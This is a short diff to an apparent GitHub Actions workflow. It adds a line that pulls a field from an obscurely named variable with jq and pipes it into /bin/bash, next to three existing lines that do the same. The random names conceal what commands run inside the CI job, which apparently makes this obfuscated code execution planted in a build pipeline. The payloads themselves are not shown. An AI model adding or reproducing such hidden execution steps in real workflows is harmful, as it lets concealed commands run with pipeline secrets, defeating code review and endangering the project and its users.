@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$kkjim860" | jq -r .kby460 | /bin/bash
           echo $r30 | jq -r .ferf34527 | /bin/bash
           printf '%s' "$rfc243" | jq -r .v676 | /bin/bash
+          echo $hb3275 | jq -r .zraz20856 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
